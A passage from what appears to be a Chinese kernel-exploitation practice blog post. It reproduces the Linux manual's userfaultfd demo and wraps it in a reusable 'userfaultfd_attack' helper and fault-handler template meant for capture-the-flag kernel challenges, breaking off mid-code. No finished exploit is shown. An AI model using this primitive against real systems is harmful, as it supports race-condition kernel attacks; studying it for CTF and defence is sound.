*/</span><br><br>   <span class="hljs-keyword">for</span> (;;) &#123;<br><br>       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>       <span class="hljs-type">int</span> nready;<br>       pollfd.fd = uffd;<br>       pollfd.events = POLLIN;<br>       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>               <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>               (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>               (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>       <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>       nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>       <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>       <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>       <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">          region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">          is more obvious that each fault is handled separately. */</span><br><br>       <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>       fault_cnt++;<br><br>       uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>       <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">          So, round faulting address down to page boundary */</span><br><br>       uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                          ~(page_size - <span class="hljs-number">1</span>);<br>       uffdio_copy.len = page_size;<br>       uffdio_copy.mode = <span class="hljs-number">0</span>;<br>       uffdio_copy.copy = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>我们的整个手册上的测试用例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* userfaultfd_demo.c</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Licensed under the GNU General Public License version 2 or later.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg)    do &#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                       &#125; while (0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>   <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>   <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>   <span class="hljs-type">ssize_t</span> nread;<br><br>   uffd = (<span class="hljs-type">long</span>) arg;<br><br>   <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>   <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) &#123;<br>       page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>           errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">      file descriptor */</span><br><br>   <span class="hljs-keyword">for</span> (;;) &#123;<br><br>       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>       <span class="hljs-type">int</span> nready;<br>       pollfd.fd = uffd;<br>       pollfd.events = POLLIN;<br>       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>               <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>               (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>               (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>       <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>       nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>       <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>       <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>       <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">          region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">          is more obvious that each fault is handled separately. */</span><br><br>       <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>       fault_cnt++;<br><br>       uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>       <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">          So, round faulting address down to page boundary */</span><br><br>       uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                          ~(page_size - <span class="hljs-number">1</span>);<br>       uffdio_copy.len = page_size;<br>       uffdio_copy.mode = <span class="hljs-number">0</span>;<br>       uffdio_copy.copy = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>   &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>   <span class="hljs-type">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>   <span class="hljs-type">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>   <span class="hljs-type">int</span> s;<br><br>   <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>       <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s num-pages\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>       <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>   &#125;<br><br>   page_size = sysconf(_SC_PAGE_SIZE);<br>   len = strtoul(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>) * page_size;<br><br>   <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br><br>   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>   <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>       errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>   uffdio_api.api = UFFD_API;<br>   uffdio_api.features = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>       errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>   <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">      demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">      actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">      the userfaultfd. */</span><br><br>   addr = mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE,<br>               MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>       errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address returned by mmap() = %p\n&quot;</span>, addr);<br><br>   <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">      handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">      missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>   uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>   uffdio_register.range.len = len;<br>   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>       errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>   <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br><br>   s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br>   <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>       errno = s;<br>       errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Main thread now touches memory in the mapping, touching</span><br><span class="hljs-comment">      locations 1024 bytes apart. This will trigger userfaultfd</span><br><span class="hljs-comment">      events for all pages in the region. */</span><br><br>   <span class="hljs-type">int</span> l;<br>   l = <span class="hljs-number">0xf</span>;    <span class="hljs-comment">/* Ensure that faulting address is not on a page</span><br><span class="hljs-comment">                  boundary, in order to test that we correctly</span><br><span class="hljs-comment">                  handle that case in fault_handling_thread() */</span><br>   <span class="hljs-keyword">while</span> (l &lt; len) &#123;<br>       <span class="hljs-type">char</span> c = addr[l];<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Read address %p in main(): &quot;</span>, addr + l);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>, c);<br>       l += <span class="hljs-number">1024</span>;<br>       usleep(<span class="hljs-number">100000</span>);         <span class="hljs-comment">/* Slow things down a little */</span><br>   &#125;<br><br>   <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>情况如下：</p><img src="/2023/06/24/Linux-Kernel-0x02-Practice/userfaultfd_demo.png" class=""><p>我们可以参考到，在mmap之后也就是最上面的红线所得到的地址，我们在第一次访问他时出现了缺页异常，因此我们的轮询线程检测到我们之前定义的监控范围内出现异常，这使得该函数可以继续运行，因此将该内存区域填充A，所以在我们处理完了用户版的缺页异常后，该内存区域内全是A。</p><p>说了这么多我们会发现利用他是如此繁琐的一个过程，所以干脆咱们现在来写一个userfaultfd的万能板子，到时候写题就不需要重新回顾这些变量名了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span>         </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg) do&#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                    &#125; while(0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>&#123;<br>  <span class="hljs-type">long</span> uffd;<br>  <span class="hljs-type">pthread_t</span> thr;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>  <span class="hljs-type">int</span> s;<br><br>  <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>  <span class="hljs-keyword">if</span>(uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>  uffdio_api.api = UFFD_API;<br>  uffdio_api.features = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>  uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>  uffdio_register.range.len = len;<br>  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>  <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>  s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd);<br>  <span class="hljs-keyword">if</span>(s != <span class="hljs-number">0</span>)&#123;<br>    errno = s;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>有了上面的代码，我们就可以只需要使用<code>userfaultfd_attack(addr, len, handler)</code>就可以避免刚才咱们的一系列初始化步骤了，之后就是比较重要的handler函数的编写，这一部分更主要的是靠我们在赛时自行思考diy，这里给出较为通用的模板，也就是linux手册上面的，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span>* page; <span class="hljs-comment">/* the data you want to overwrite */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span> <span class="hljs-comment">/* data read from userfaultfd */</span><br>  <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>  <span class="hljs-type">long</span> uffd;        <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>  <span class="hljs-type">ssize_t</span> nread;<br><br>  uffd = (<span class="hljs-type">long</span>)arg;<br><br>  <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd file descriptor */</span><br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-type">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span>(nready == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>    <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br>    nread = 